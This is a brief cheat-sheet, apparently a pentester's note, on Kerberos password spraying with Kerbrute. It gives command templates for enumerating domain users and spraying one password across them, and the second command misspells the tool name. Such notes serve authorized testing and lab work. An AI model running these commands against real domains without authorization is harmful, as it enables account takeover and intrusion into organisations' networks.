# Password Spraying with Kerberos
## Kerbrute
### User Enumeration
* Create a list of users and save it as a .txt
* Spray for users
```bash
kerbrute userenum <user.txt> --dc <DC FQDN> -d <domain>
```
### Password Spraying
* Create a list of users(or use the list from the above process)
* Spray a known password over all of those users
```bash
kerberute passwordspray <users.txt> <password to spray> --dc <DC FQDN> -d <domain>
```
